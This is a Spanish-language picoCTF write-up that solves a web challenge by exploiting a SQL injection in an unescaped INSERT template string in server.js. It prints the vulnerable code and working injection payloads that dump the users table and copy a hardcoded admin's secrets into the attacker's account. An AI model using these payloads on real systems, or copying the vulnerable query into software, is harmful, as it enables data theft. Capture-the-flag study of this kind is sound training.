# Descripción
This secret box is designed to conceal your secrets.
It's perfectly secure—only you can see what's inside.
Or can you? Try uncovering the admin's secret.
Browse here, can you find the secret message?

# Solución
Primero descargamos el archivo source.tar.gz y lo descomprimimos con:

tar -xzf source.tar.gz, ahí descargamos una imagen Docker, nos ubicamos en la carpeta src y levantamos la app con:

```
docker-compose up --build
```

Una vez levantado observamos que corre en el puerto 8080:80, nos ubicamos con localhost en dicho puerto. Al ingresar a la app, creamos un usario y nos logueamos, aquí podemos crear secretos mediante un label de texto.

Al loguearnos, en el inspector, network, cookies se nos crea una cookie de auth_token.

Entonces en el código fuente analizamos el que maneja la lógica de los secretos, el cual es el archivo handler.js, y observamos las siguientes líneas:

``` 
const cookies = getCookies(req.headers.cookie);
const token = cookies.auth_token;
```

y

```
SELECT * FROM tokens WHERE id = ? AND expired_at > NOW()
```

Significa que el token determina que usuario eres, la cual es la lógica de:

auth_token → tabla tokens → user_id → acceder a datos

Entonces si existe un usario admin, debe de tener su identificador, para verificarlo nos vamos al archivo de la bd, el initdb.sql y lo analizamos, ahí observamos que en efecto se crea el usuario admin y también esta su identificador, también observamos que cuenta con un secreto:

```
INSERT INTO secrets(owner_id, content) 
VALUES ('e2a66f7d-2ce6-4861-b4aa-be8e069601cb', 'picoCTF{fake_flag}');
```

el tiene la flag (dicho valor de la flag se actualiza cuando se levanta Docker).

Por ultimo analizamos la lógica central del sistema, que se encuentra en server.js, ahí observamos que realiza varias consultas sql, todas seguras, excepto por una vulnerabilidad:

```
const query = await db.raw(
    `INSERT INTO secrets(owner_id, content) VALUES ('${userId}', '${content}')`
);
```


Cuando observamos este tipo de cosas:

```
${userId}', '${content}
```

significa que el valor es asignado desde el usuario, por lo que se le puede hacer inyección de sql. El valor de content no esta escapado, ósea que podemos cerrar la query y ejecutar otra.

A sabiendas de todo esto, necesitamos leer el secreto del admin, el cual contiene la flag.

Como el admin se crea por defecto y esta hardcodeado, entonces siempre tiene el mismo user id, por lo que podemos usar la siguiente inyección:

```
'); INSERT INTO secrets(owner_id,content)
SELECT 'mi_user_id',content
FROM secrets
WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb'; --
```

Una vez tenemos la inyección nos vamos al server real y creamos un usuario y nos vamos a los secretos, le damos a crear un secreto e inyectamos la siguiente consulta para obtener su user_id:

```
test'); SELECT * FROM users; --
```

El server nos devuelve un error y observamos nuestro user id, una vez lo tenemos, completamos nuestra inyección:

```
'); INSERT INTO secrets(owner_id,content)
SELECT '24f7fdc7-637e-4e68-a277-54d500e0233c',content
FROM secrets
WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb'; --
```

lo pegamos en la sección de crear nuevo secreto, lo enviamos y con esto hemos copiado los secretos del admin a nuestra cuenta de usuario.

y encontramos la flag:

picoCTF{sq1_1nject10n_429d1d8c}
# Notas adicionales
- 
# Referencias
- 